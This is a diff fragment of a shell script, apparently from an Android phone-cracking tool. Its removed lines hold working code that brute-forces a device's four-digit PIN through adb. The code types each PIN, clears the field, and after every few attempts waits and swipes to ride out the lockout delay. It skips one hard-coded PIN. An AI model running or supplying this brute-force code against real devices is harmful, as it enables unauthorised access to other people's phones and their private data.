@@ -228,31 +228,6 @@ androidgui4() {
             for i in {0000..9999}; do
                 if [[ $i != 1036 ]]; then
                     echo -e "\e[0;1mTrying pin:  $i\e[0m"
-                    for (( j=0; j<${#i}; j++ )); do
-                        adb shell input keyevent $((`echo ${i:$j:1}`+7))
-                    done
-                    adb shell input keyevent 66
-                    adb shell input swipe 407 1211 378 85
-                    clear() {
-                        adb shell input keyevent KEYCODE_MOVE_END
-                        adb shell input keyevent --longpress $(printf 'KEYCODE_DEL %.0s' {1..250}); } ;clear
-                    if ! (( `expr $i + 1` % 4 )); then
-                        adb shell input keyevent 66
-                        sleep 5
-                        adb shell input swipe 407 1211 378 85
-                        sleep 5
-                        adb shell input swipe 407 1211 378 85
-                        sleep 5 
-                        adb shell input swipe 407 1211 378 85
-                        sleep 5
-                        adb shell input swipe 407 1211 378 85
-                        sleep 5
-                        adb shell input swipe 407 1211 378 85
-                        sleep 5
-                        adb shell input keyevent 3
-                        adb shell input keyevent 82
-                        adb shell input swipe 407 1211 378 85
-                    fi
                 fi
             done
         done
